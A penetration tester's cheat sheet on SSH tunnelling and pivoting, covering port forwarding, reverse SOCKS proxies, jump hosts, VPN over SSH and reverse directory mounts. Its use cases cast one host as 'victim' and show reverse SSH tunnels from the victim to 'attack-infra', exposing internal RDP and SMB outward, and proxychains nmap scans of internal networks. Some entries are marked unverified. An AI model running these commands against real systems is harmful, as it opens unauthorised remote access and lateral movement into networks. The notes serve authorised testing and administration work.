
### misc

    https://marcusedmondson.com/2022/01/28/pivoting-with-ssh-tunnels-and-plink/
    https://github.com/opsdisk/the_cyber_plumbers_handbook

### local port forwarding

requires: 'AllowTcpForwarding yes' on SSHD

    ssh <gateway> -L <local port to listen>:<remote host>:<remote port>
    (exposes remote service <remote host>:<remote port> to local port via ssh tunnel)
    (connections made to <local port to listen> will be forwarded to <remote host>:<remote port>)

    # use case #1: prepare tunnel for attacking your victim
    pen-tester$ ssh user@attack-infra -L 1234:victim:80
    pen-tester$ curl http://127.0.0.1:1234

    # use case #2: attack victim's 445 port when access to it's sshd has been obtained
    attack-infra$ ssh user@victim -L 1234:127.0.0.1:445
    pen-tester$ nbtscan attack-infra:1234

### remote port forwarding

requires: 'AllowTcpForwarding yes' on SSHD

    ssh <gateway> -R <remote port to bind>:<local host>:<local port>
    (exposes local serivce <local host>:<local port> on the remote host via ssh tunnel)
    (connections made to <remote port to bind> on remote host will be forwared to <local host>:<local port>)

    # use case #1: expose internal RDP service to outside of the intranet
    victim$ ssh user@attack-infra -p53 -R 1234:127.0.0.1:3389
    pen-tester$ rdesktop attack-infra:1234 

    # use case #2 (special case of #1): reverse SSH tunnel (from victim to attack-infra)
	# NOTE: on attack-infra in /etc/ssh/sshd_config set 'GatewayPorts yes' to be able connect from pen-tester
    victim$ ssh -f -N -p53 -R 2222:127.0.0.1:22 user@attack-infra
    pen-tester$ ssh user@attack-infra -p2222

    # use case #3 (the same as #2 but with additional IP access control) - didn't work for me
	# NOTE: on attack-infra in /etc/ssh/sshd_config set 'GatewayPorts clientspecified' to be able connect from pen-tester
    victim$ ssh -f -N -p53 -R <pen-tester-ip>:2222:127.0.0.1:22 user@attack-infra
    pen-tester$ ssh user@attack-infra -p2222

### dynamic port forwarding

Requires: `AllowTcpForwarding yes` on SSHD (default setting)

    ssh -D <local proxy host:port> -p <remote port> <target>

    # use case #1: create local socks4 proxy which will tunnel incoming traffic to victimDMZ
    ssh -D1234 -p22 user@victim

    # use case #2: reverse ssh from victim allows to scan whole internal network
    victim$ ssh -f -N -R 2222:127.0.0.1:22 root@attack-infra
    pen-tester$ ssh -f -N -D 127.0.0.1:8082 -p 2222 root@attack-infra
    pen-tester$ (add 'socks4 127.0.0.1 8082' to /etc/proxychains.conf)
    pen-tester$ proxychains nmap --top-ports=20 -sT -Pn <target> 

Wrapper to provide `ssh -D` functionality in cases when forwarding is disabled (`AllowTcpForwarding No`):

	https://github.com/TarlogicSecurity/SaSSHimi

### reverse SOCKS proxy

On Linux box (SSH’d to localhost with the -D option to get the SOCKS server running, then make a second connection to the Internet to port-forward access to the SOCKS service):

```
# (not verified solution yet):
ssh -D4321 user@127.0.0.1
ssh -N -P443 -i key.pem -R 1234:127.0.0.1:4321 user@external_attack_machine

# on 'external_attack_machine' use proxchains with following configuration:
socks5 127.0.0.1 1234
```

From Windows box (3rd party software needed to run SOCKS server):

    https://labs.portcullis.co.uk/blog/reverse-port-forwarding-socks-proxy-via-http-proxy-part-1/

Possible alternative (no SSH used) solutions:

    https://github.com/klsecservices/rpivot
    https://github.com/sensepost/reGeorg

### SSH over SSL

    http://blog.chmd.fr/ssh-over-ssl-episode-2-replacing-proxytunnel-with-socat.html

### ssh over socks proxy

    $ ssh -i key.pem -o 'ProxyCommand=nc -X 5 -x proxy:1080 %h %p' user@host

### connect to host via other SSH jump box

Basic scenario:

    ssh -o ProxyCommand="ssh -W %h:%p -i proxykey.pem proxy_user@proxy_host" user@host
    scp -r -o ProxyCommand="ssh -W %h:%p -i proxykey.pem proxy_user@proxy_host" user@host:dir ./

Multiple SSH hops:

    ssh -i host-key.pem -J user1@hop1,user2@hop2 user@host
	scp -i host-key.pem -r -o 'ProxyJump user1@hop1,user2@hop2' user@host:dir ./

Multiple SSH hops each requiring different identity key:

```
eval `ssh-agent -s`
ssh-add -D
ssh-add key1.pem 
ssh-add key2.pem
ssh -i host-key.pem -Juser1@hop1,user2@hop2 user@host
```

### VPN over SSH

Requires modifications of sshd configuration, specifically:

```
PermitRootLogin yes
PermitTunnel yes # non-default setting
```

Run:

```
ssh username@server -w any:any
```

For detailed setup see: `https://artkond.com/2017/03/23/pivoting-guide/#vpn-over-ssh`.

### custom VPN solution over SSH

Poor's man VPN solution over SSH tunnel (no server-side modifications are needed):

    https://github.com/sshuttle/sshuttle

### mounting directories over SSH

    https://github.com/libfuse/sshfs

    # reverse directory mount (https://superuser.com/questions/616182/how-to-mount-local-directory-to-remote-like-sshfs/918708#918708):
    ncat -l -p 34567 -e "/usr/lib/ssh/sftp-server" & ssh -t -R 34568:localhost:34567 -i key.pem user@IP "sudo -E sshfs localhost: DIRNAME -o directport=34568; sudo -E bash"

### Metasploit via jump host

    https://www.ryanwendel.com/2020/02/02/forwarding-shells-through-a-jump-box-using-ssh/

### Other interesting


```
https://github.com/sshuttle/sshuttle
https://github.com/stealth/sshttp
# rescue when "ssh -D" is not supported by the sshd:
https://github.com/TarlogicSecurity/SaSSHimi
# blending your SSH traffic:
https://github.com/dsnezhkov/SSHoRTY
```

   

